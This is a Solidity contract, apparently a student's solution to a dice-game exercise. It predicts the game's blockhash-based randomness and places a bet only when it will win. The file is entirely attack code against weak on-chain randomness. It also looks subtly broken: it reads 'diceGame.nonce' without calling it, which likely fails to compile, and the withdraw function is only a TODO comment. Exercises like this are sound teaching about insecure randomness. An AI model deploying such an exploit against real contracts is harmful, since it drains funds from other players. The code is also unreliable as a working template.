pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    event Received(address, uint);
    event Rolled(uint);
    event NotRolled(uint);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address


    function riggedRoll() public {

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), diceGame.nonce));
        uint256 expectedResult = uint256(hash) % 16;

        if (expectedResult <= 2 ) {
            diceGame.rollTheDice{value: 0.002 ether}();
            emit Rolled(expectedResult);
        } else {
            emit NotRolled(expectedResult);
        }

    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

}
